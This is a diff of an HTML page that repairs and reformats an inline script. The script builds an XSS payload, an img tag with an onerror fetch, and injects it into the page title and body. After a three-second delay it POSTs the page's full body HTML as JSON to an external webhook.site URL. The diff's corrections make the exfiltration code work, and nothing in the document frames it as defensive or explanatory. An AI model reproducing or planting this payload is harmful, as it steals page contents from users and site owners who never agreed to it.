@@ -7,31 +7,31 @@
 </head>
 <body>
   <p>"DATA"</p>
-    <script>
-        // Function to create a script tag with a POST request
-        function createScriptWithPostRequest() {
-            var method = "POST";
-            var url = "https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e";
-            var body = JSON.stringify({
-                Contents: document.body.innerHTML
-            });
-            var headers = {
-                "Content-type": "application/json; charset=UTF-8",
-                "mode": "no-cors"
-            };
+  <script>
+    // Function to create a script tag with a POST request
+    function createScriptWithPostRequest() {
+      var method = "POST";
+      var url = "https://webhook.site/e6ee5b29-cbae-45b0-84f2-f09da517960e";
+      var body = JSON.stringify({
+        Contents: document.body.innerHTML
+      });
+      var headers = {
+        "Content-type": "application/json; charset=UTF-8",
+        "mode": "no-cors"
+      };
 
-            var fetchString = 'fetch(' + url + ', {method: ' + method + ', body: ' + body + ', headers: ' + JSON.stringify(headers) + '})';
-            var XSS = '<img src="/" onerror="' + fetchString + '"/>';
-            document.title = XSS;
+      var fetchString = 'fetch("' + url + '", {method: "' + method + '", body: ' + body + ', headers: ' + JSON.stringify(headers) + '})';
+      var XSS = '<img src="/" onerror="' + fetchString + '"/>';
 
-            var container = document.createElement('div');
-            container.innerHTML = XSS;
-            document.body.appendChild(container);
+      document.title = XSS;
 
-        // Wait for 3 seconds and then create the script tag with the POST request
-        setTimeout(function () {
-            createScriptWithPostRequest();
-        }, 3000);
-    </script>
+      var container = document.createElement('div');
+      container.innerHTML = XSS;
+      document.body.appendChild(container);
+    }
+
+    // Wait for 3 seconds and then create the script tag with the POST request
+    setTimeout(createScriptWithPostRequest, 3000);
+  </script>
 </body>
 </html>
